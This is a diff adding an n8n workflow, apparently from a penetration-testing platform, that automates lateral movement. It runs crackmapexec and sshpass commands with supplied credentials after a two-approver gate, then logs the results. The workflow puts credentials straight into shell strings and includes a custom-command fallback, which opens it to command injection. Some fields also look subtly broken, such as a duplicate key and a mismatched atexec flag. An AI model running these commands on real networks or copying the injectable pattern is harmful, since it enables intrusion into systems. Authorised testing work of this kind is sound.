@@ -1,0 +1,402 @@
+id: 11
+name: Lateral Movement Workflow
+active: true
+settings:
+  executionOrder: v1
+  saveManualExecutions: true
+nodes:
+  - id: webhook
+    name: Webhook Trigger
+    type: n8n-nodes-base.webhook
+    typeVersion: 1
+    position:
+      - 250
+      - 300
+    parameters:
+      path: anptop/lateral-movement
+      httpMethod: post
+      options: {}
+  - id: validate-target
+    name: Validate Target
+    type: n8n-nodes-base.function
+    typeVersion: 1
+    position:
+      - 450
+      - 300
+    parameters:
+      functionCode: |
+        const request = items[0].json;
+        
+        // Validate target is in scope
+        const validation = {
+          target_in_scope: false,
+          target_ip: request.target_ip,
+          source_ip: request.source_ip,
+          source_session: request.session_id,
+          technique: request.technique,
+          validated: false,
+          validation_errors: []
+        };
+        
+        // Check if target IP format is valid
+        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
+        if (!ipRegex.test(request.target_ip)) {
+          validation.validation_errors.push('Invalid target IP format');
+        }
+        
+        // Check if source session exists
+        if (!request.session_id) {
+          validation.validation_errors.push('No source session provided');
+        }
+        
+        // Check technique
+        const validTechniques = ['wmiexec', 'psexec', 'smbexec', 'atexec', 'dcomexec', 'ssh', 'powershell'];
+        if (!validTechniques.includes(request.technique)) {
+          validation.validation_errors.push(`Invalid technique: ${request.technique}`);
+        }
+        
+        validation.validated = validation.validation_errors.length === 0;
+        
+        return [{
+          json: {
+            ...request,
+            ...validation
+          }
+        }];
+  - id: assess-risk
+    name: Assess Lateral Risk
+    type: n8n-nodes-base.function
+    typeVersion: 1
+    position:
+      - 650
+      - 300
+    parameters:
+      functionCode: |
+        const request = items[0].json;
+        
+        // High-risk operation - always requires escalation
+        const riskAssessment = {
+          risk_level: 'critical',
+          required_approvers: 2,
+          required_roles: ['TEAM_LEAD', 'CISO'],
+          requires_justification: true,
+          audit_logging: true,
+          approval_timeout_hours: 2,
+          impact: {
+            scope_expansion: true,
+            additional_systems: true,
+            potential_data_breach: true
+          },
+          mitigation_required: 'Document business justification and scope limits'
+        };
+        
+        return [{
+          json: {
+            ...request,
+            ...riskAssessment
+          }
+        }];
+  - id: request-approval
+    name: Request Approval
+    type: n8n-nodes-base.httpRequest
+    typeVersion: 1
+    position:
+      - 850
+      - 300
+    parameters:
+      method: post
+      url: >-
+        http://backend:8000/api/v1/approvals
+      sendHeaders: true
+      headerParameters:
+        parameters:
+          - name: Authorization
+            value: Bearer {{ $env.API_TOKEN }}
+      sendBody: true
+      bodyParameters:
+        parameters:
+          - name: json
+            value: >-
+              {"engagement_id": {{ $json.engagement_id }}, "approval_type": "lateral_movement", "title": "Lateral movement: {{ $json.technique }} to {{ $json.target_ip }}", "description": "Attempt {{ $json.technique }} lateral movement from {{ $json.source_ip }} to {{ $json.target_ip }}", "risk_level": "critical", "required_approvers": 2, "required_roles": ["TEAM_LEAD", "CISO"], "justification_required": true, "session_id": {{ $json.session_id }}}
+      options: {}
+  - id: wait-approval
+    name: Wait for Approval
+    type: n8n-nodes-base.wait
+    typeVersion: 1
+    position:
+      - 1050
+      - 300
+    parameters:
+      amount: 2
+      unit: hours
+      resume: interval
+  - id: check-approval
+    name: Check Approval
+    type: n8n-nodes-base.httpRequest
+    typeVersion: 1
+    position:
+      - 1250
+      - 300
+    parameters:
+      method: get
+      url: >-
+        http://backend:8000/api/v1/approvals/{{ $json.approval_id }}
+      sendHeaders: true
+      headerParameters:
+        parameters:
+          - name: Authorization
+            value: Bearer {{ $env.API_TOKEN }}
+      options: {}
+  - id: is-approved
+    name: Is Approved
+    type: n8n-nodes-base.if
+    typeVersion: 1
+    position:
+      - 1450
+      - 300
+    parameters:
+      conditions:
+        string:
+          - value1: "{{ $json.status }}"
+            operation: equal
+            value2: "approved"
+  - id: build-command
+    name: Build Lateral Command
+    type: n8n-nodes-base.function
+    typeVersion: 1
+    position:
+      - 1650
+      - 300
+    parameters:
+      functionCode: |
+        const request = items[0].json;
+        const technique = request.technique;
+        
+        // Build command based on technique
+        const commands = {
+          'wmiexec': `cme smb ${request.target_ip} -u '${request.username}' -p '${request.password}' -x 'whoami'`,
+          'psexec': `cme smb ${request.target_ip} -u '${request.username}' -p '${request.password}' --psexec`,
+          'smbexec': `cme smb ${request.target_ip} -u '${request.username}' -p '${request.password}' --smbexec`,
+          'atexec': `cme smb ${request.target_ip} -u '${request.username}' -p '${request.password}' --hammer`,
+          'dcomexec': `cme smb ${request.target_ip} -u '${request.username}' -p '${request.password}' --dcomexec`,
+          'ssh': `sshpass -p '${request.password}' ssh ${request.username}@${request.target_ip} 'whoami'`,
+          'powershell': `crackmapexec smb ${request.target_ip} -u '${request.username}' -p '${request.password}' -X 'whoami'`
+        };
+        
+        const command = commands[technique] || request.custom_command;
+        
+        return [{
+          json: {
+            ...request,
+            command: command,
+            timeout: request.timeout || 120,
+            lateral_command: command
+          }
+        }];
+  - id: execute-lateral
+    name: Execute Lateral
+    type: n8n-nodes-base.executeCommand
+    typeVersion: 1
+    position:
+      - 1850
+      - 300
+    parameters:
+      command: "{{ $json.lateral_command }}"
+      options:
+        shell: true
+        workingDirectory: /tmp/anptop/lateral
+        timeout: "{{ $json.timeout || 120 }}"
+  - id: parse-results
+    name: Parse Results
+    type: n8n-nodes-base.function
+    typeVersion: 1
+    position:
+      - 2050
+      - 300
+    parameters:
+      functionCode: |
+        const output = items[0].json.stdout || '';
+        const error = items[0].json.stderr || '';
+        
+        const result = {
+          success: false,
+          error_message: null,
+          new_host_accessible: false,
+          pivoting_possible: false,
+          credentials_used: null,
+          session_created: false
+        };
+        
+        // Parse CME output
+        if (output.includes('[+]') || output.includes('SUCCESS')) {
+          result.success = true;
+          result.new_host_accessible = true;
+          result.pivoting_possible = true;
+          
+          // Check for session creation
+          if (output.includes('Session') || output.includes('shell')) {
+            result.session_created = true;
+          }
+        } else if (output.includes('[-]') || output.includes('FAILED') || error.includes('Access denied')) {
+          result.error_message = error || 'Lateral movement failed - access denied or timeout';
+        }
+        
+        return [{
+          json: {
+            ...items[0].json,
+            output: output.substring(0, 5000),
+            ...result
+          }
+        }];
+  - id: create-session
+    name: Create Session Record
+    type: n8n-nodes-base.httpRequest
+    typeVersion: 1
+    position:
+      - 2250
+      - 300
+    parameters:
+      method: post
+      url: >-
+        http://backend:8000/api/v1/lateral-movement
+      sendHeaders: true
+      headerParameters:
+        parameters:
+          - name: Authorization
+            value: Bearer {{ $env.API_TOKEN }}
+      sendBody: true
+      bodyParameters:
+        parameters:
+          - name: json
+            value: >-
+              {"engagement_id": {{ $json.engagement_id }}, "source_host_id": {{ $json.source_host_id }}, "target_host_id": {{ $json.target_host_id }}, "target_ip": "{{ $json.target_ip }}", "technique": "{{ $json.technique }}", "status": "{{ $json.success ? 'completed' : 'failed' }}", "success": {{ $json.success }}, "output": "{{ $json.output | replace('\"', '\\\"') }}", "error_message": "{{ $json.error_message || '' }}", "pivoting_possible": {{ $json.pivoting_possible }}}
+      options: {}
+  - id: collect-evidence
+    name: Collect Evidence
+    type: n8n-nodes-base.httpRequest
+    typeVersion: 1
+    position:
+      - 2450
+      - 300
+    parameters:
+      method: post
+      url: >-
+        http://backend:8000/api/v1/webhooks/evidence-collection
+      sendHeaders: true
+      headerParameters:
+        parameters:
+          - name: Authorization
+            value: Bearer {{ $env.API_TOKEN }}
+      sendBody: true
+      bodyParameters:
+        parameters:
+          - name: json
+            value: >-
+              {"engagement_id": {{ $json.engagement_id }}, "lateral_movement_id": {{ $json.lateral_movement_id }}, "host_id": {{ $json.target_host_id }}, "evidence_types": ["command_output", "screenshot"], "triggered_by": "lateral_movement"}
+      options: {}
+    parameters:
+      condition: "{{ $json.success }}"
+  - id: audit-log
+    name: Audit Log
+    type: n8n-nodes-base.httpRequest
+    typeVersion: 1
+    position:
+      - 2650
+      - 300
+    parameters:
+      method: post
+      url: >-
+        http://backend:8000/api/v1/audit/log
+      sendHeaders: true
+      headerParameters:
+        parameters:
+          - name: Authorization
+            value: Bearer {{ $env.API_TOKEN }}
+      sendBody: true
+      bodyParameters:
+        parameters:
+          - name: json
+            value: >-
+              {"action": "lateral_movement", "resource_type": "host", "details": {"source": "{{ $json.source_ip }}", "target": "{{ $json.target_ip }}", "technique": "{{ $json.technique }}", "success": {{ $json.success }}, "session_id": {{ $json.session_id }}}, "engagement_id": {{ $json.engagement_id }}}
+      options: {}
+  - id: webhook-response
+    name: Webhook Response
+    type: n8n-nodes-base.webhook
+    typeVersion: 1
+    position:
+      - 2850
+      - 300
+    parameters:
+      respondWith: json
+      jsonResponse: >-
+        {"status": "{{ $json.success ? 'success' : 'failed' }}", "target": "{{ $json.target_ip }}", "pivoting_possible": {{ $json.pivoting_possible }}, "execution_id": {{ $execution.id }} }
+      options: {}
+connections:
+  Webhook Trigger:
+    main:
+      - - node: Validate Target
+          type: main
+          index: 0
+  Validate Target:
+    main:
+      - - node: Assess Lateral Risk
+          type: main
+          index: 0
+  Assess Lateral Risk:
+    main:
+      - - node: Request Approval
+          type: main
+          index: 0
+  Request Approval:
+    main:
+      - - node: Wait for Approval
+          type: main
+          index: 0
+  Wait for Approval:
+    main:
+      - - node: Check Approval
+          type: main
+          index: 0
+  Check Approval:
+    main:
+      - - node: Is Approved
+          type: main
+          index: 0
+  Is Approved:
+    main:
+      - - node: Build Lateral Command
+          type: main
+          index: 0
+  Build Lateral Command:
+    main:
+      - - node: Execute Lateral
+          type: main
+          index: 0
+  Execute Lateral:
+    main:
+      - - node: Parse Results
+          type: main
+          index: 0
+  Parse Results:
+    main:
+      - - node: Create Session Record
+          type: main
+          index: 0
+  Create Session Record:
+    main:
+      - - node: Collect Evidence
+          type: main
+          index: 0
+      - - node: Audit Log
+          type: main
+          index: 0
+  Collect Evidence:
+    main:
+      - - node: Webhook Response
+          type: main
+          index: 0
+  Audit Log:
+    main:
+      - - node: Webhook Response
+          type: main
+          index: 0
